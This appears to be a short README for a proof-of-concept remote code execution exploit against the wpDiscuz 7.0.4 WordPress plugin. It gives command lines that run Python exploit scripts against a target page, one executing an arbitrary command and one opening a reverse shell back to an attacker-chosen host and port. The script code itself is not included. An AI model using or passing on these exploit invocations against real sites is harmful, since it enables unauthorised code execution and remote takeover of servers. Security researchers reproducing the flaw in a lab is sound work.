# wpDiscuz-7.0.4-PoC-RCE

# Remote code execute
python3 wpdiscuz_rce.py   -u http://localhost:8080   -p "/?p=1" --cmd "id"

# reverse shell
python3 exploit.py -u http://localhost:8080 -p "/?p=1" --reverse --lhost 172.17.0.1 --lport 4444
